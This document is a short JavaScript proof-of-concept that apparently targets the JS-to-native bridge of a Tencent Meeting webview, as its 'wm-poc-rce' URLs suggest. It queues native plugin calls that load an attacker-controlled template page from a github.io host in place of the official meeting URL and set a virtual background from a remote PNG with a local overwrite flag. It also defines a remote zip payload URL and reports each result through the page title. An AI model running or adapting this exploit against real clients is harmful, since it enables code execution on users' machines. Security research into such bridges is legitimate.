(function(){
  document.title='P86TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P86CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,56);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P86TB-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P86TB-NOMGR:'+location.host;return}
  var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
  var tpl='https://gitwhs.github.io/wm-poc-rce/p86tpl.html';
  var zip='https://gitwhs.github.io/wm-poc-rce/p50.zip';
  var png='https://gitwhs.github.io/wm-poc-rce/p40.png';
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['T1','CommonPlugin','LoadTemplateWebView',{url:official,template_url:official,template_id:'p86'}],
    ['T3','CommonPlugin','LoadTemplateWebView',{url:tpl,template_url:official,template_id:'p86b'}],
    ['SV','VirtualBackgroundWebPlugin','SetVirtualBackground',{url:png,local_path:png,over_write:true}],
    ['SV2','VirtualBackgroundWebPlugin','SetVirtualBackgroundByType',{type:1,url:png}]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P86TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P86-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 3500);
  }
  setTimeout(n, 800);
})();
